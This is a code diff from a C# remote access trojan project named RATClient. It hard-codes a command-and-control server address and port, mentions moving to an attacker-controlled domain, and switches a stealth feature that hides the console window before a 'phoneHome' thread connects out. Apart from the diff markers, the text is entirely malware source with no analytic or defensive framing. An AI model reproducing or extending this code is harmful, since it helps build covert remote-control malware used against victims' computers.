@@ -16,8 +16,8 @@ namespace RATClient
 {
     class Program
     {
-        //static IPAddress CCIP = IPAddress.Parse("192.168.1.1");    //In future, read this from text file or link to attacker controlled domain
-        static IPAddress CCIP = Dns.GetHostEntry(Dns.GetHostName()).AddressList[0];
+        static IPAddress CCIP = IPAddress.Parse("192.168.80.132");    //In future, read this from text file or link to attacker controlled domain
+        //static IPAddress CCIP = Dns.GetHostEntry(Dns.GetHostName()).AddressList[0];
         static IPAddress localIP = Dns.GetHostEntry(Dns.GetHostName()).AddressList[0];
         static IPEndPoint CCServ = new IPEndPoint(CCIP, 5555);
         static Boolean connected = false;
@@ -37,7 +37,7 @@ namespace RATClient
                 }
                 catch (Exception e)
                 {
-                    Console.WriteLine("Connection to CC failed. Retrying...");
+                    Console.WriteLine("Connection to CC at ip {0} failed. Retrying...", CCServ.Address.MapToIPv4().ToString());
                 }
             }
             String message = "";
@@ -465,10 +465,10 @@ namespace RATClient
             var handle = GetConsoleWindow();
 
             // Hide
-            ShowWindow(handle, SW_HIDE);
+            //ShowWindow(handle, SW_HIDE);
 
             // Show
-            //ShowWindow(handle, SW_SHOW);
+            ShowWindow(handle, SW_SHOW);
             Thread t = new Thread(phoneHome);
             t.Start();
             Console.ReadLine();
